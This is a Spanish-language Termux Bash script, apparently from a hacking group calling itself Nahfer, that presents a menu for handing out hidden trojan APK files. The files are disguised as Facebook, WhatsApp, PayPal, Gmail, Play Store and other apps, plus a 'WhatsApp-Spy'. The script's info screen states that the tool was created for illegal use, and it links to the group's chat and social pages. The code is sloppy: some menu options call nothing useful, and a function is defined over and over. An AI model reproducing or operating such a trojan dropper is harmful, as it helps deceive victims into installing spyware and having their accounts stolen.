#!/bin/bash
# script creado por capitan comando
# Nahfer comunity programations

clear
funcion_del_menu(){
figlet "Nahfer" | lolcat -a
figlet "Troyanos" | lolcat -a
echo "
  Creador: Capitán Comandó.  Versión 2.0

           [1] Contacto.

           [2] Troyanos.

           [3] Troyanos link.
 
           [4] Info del script.
           
           [5] Salir" | lolcat -a
setterm -foreground green

while true; do
    read -p"
           [V]~~>" op
case $op in

        1* ) mi_grupos ; break;;
        2* ) mis_troyanos ; break;;
        3* ) clear
echo "Muy Pronto";
sleep 2
funcion_del_menu ; break;;
        4* ) mi_info ; break;;
        
        5* ) exit ; break;;
      * ) echo "opcion incorrecta."
sleep 2
clear
funcion_del_menu;;
    esac
    sleep 0.1
    clear
done
}
mi_info(){
setterm -foreground red
clear
echo "
Somos Nahfer Somos Comunidad

Por siempre es nahfer por siempre es anónima.

we are Nahfer we are community.

Forever is Nahfer Forever is anonymous.

lider: Capitan Comando.

leader: Captain Commando.

Esta Herramienta Se creo para uso ilegal.

this tool was created for illegal use

Forever Cracking

created By Captain Commando

ayudantes de la Creaccion de la herramienta.
1. ghost
2. hawnnes
3. killer
4. Matrix
" | lolcat -a

echo " Enter para volve al menu principal" | lolcat -a

read
clear
funcion_del_menu
}

mis_troyanos(){
clear
printf "

         [1] Free Fire

         [2] Facebook

         [3] Whatsapp

         [4] Instagram

         [5] Twiter
  
         [6] Galeria

         [7] Gmail

         [8] Google
   
         [9] Internet Gratis

        [10] Opera mini

        [11] PayPal

        [12] Calculadora

        [13] Camera

        [14] Elite

        [15] PlayStore

        [16] Termux

        [17] Whatsapp-Spy

        [18]

        [19]

        [20]

        [21]

        [22]

        [23]

        [24]

        [25]
" | lolcat -a

setterm -foreground green
while true; do
read -p "
 [V]~~>" op

 case $op in
         [1]* ) cp ; break;;
         [2]* ) facebook ; break;;
         [3]*) info_script ; break;;
[4]*) info_script ; break;;
[5]*) info_script ; break;;
[6]*) galeria ; break;;
[7]*) gmail ; break;;
[8]*) google ; break;;
[9]*) internet ; break;;
[10]*) opera_mini ; break;;
[11]*) paypal ; break;;
[12]*) calculadora ; break;;
[13]*) camera ; break;;
[14]*) elite ; break;;
[15]*) playtore ; break;;
[16]*) termux ; break;;
[17]*) whatsapp-spy ; break;;
[18]*) info_script ; break;;
[19]*) info_script ; break;;
[20]*) info_script ; break;;
[21]*) info_script ; break;;
[22]*) info_script ; break;;
[23]*) info_script ; break;;
[24]*) info_script ; break;;
[25]*) info_script ; break;;


       * ) echo "opcion incorrecta.";;
    esac
    sleep 0.1
    clear
done

}
mi_grupos(){
clear

echo "

      [1] Grupos De Whatsapp Nahfer Hacking 

      [2] Grupo De Facebook Nahfer Hacking

      [3] Perfil De Facebook de Capitán Comandó

      [4] Whatsapp De Capitán Comandó

" | lolcat -a
setterm -foreground green
 while true; do
 read -p "
  [V]~~>" op

  case $op in
          [1]* ) termux-open https://chat.whatsapp.com/Geqc87CzD3cF1khfFRGKxW ; break;;
          [2]* ) termux-open https://facebook.com/groups/2878231309111772/ ; break;;
          [3]* ) termux-open https://www.facebook.com/david.nahfer.1 ; break;;
          [4]* ) echo "Muy Pronto" ; break;;

   * ) echo "opcion incorrecta."
mi_grupos;;

     esac
     sleep 0.1
     clear
 done
}

galeria(){
clear
cd /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
read mover

cp .Galeria.apk $mover
}

gmail(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Gmail.apk $mover
 }

google(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Google.apk $mover
 }

internet(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Internet-gratis.apk $mover
 }

opera_mini(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Operamini.apk $mover
 }

paypal(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .PayPal.apk $mover
 }


calculadora(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Calculadora.apk $mover
 }

camera(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Camera.apk $mover
 }

elite(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Elite.apk $mover
 }

playstore(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Play-store.apk $mover
 }

termux(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Termux.apk $mover
 }

whatsapp-spy(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Whatsapp-Spy.apk $mover
 }

facebook(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Facebook.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }

Funciones(){
 clear
 /data/data/com.termux/files/Proyectos/Nahfer-Troyanos/.Troyanos
 echo "Ingresa una ubicacion para mover el archivo" | lolcat -a
 echo
echo "Ejemplo: /sdcard" | lolcat -a
echo
 read mover

cp .Galeria.apk $mover
 }
funcion_del_menu

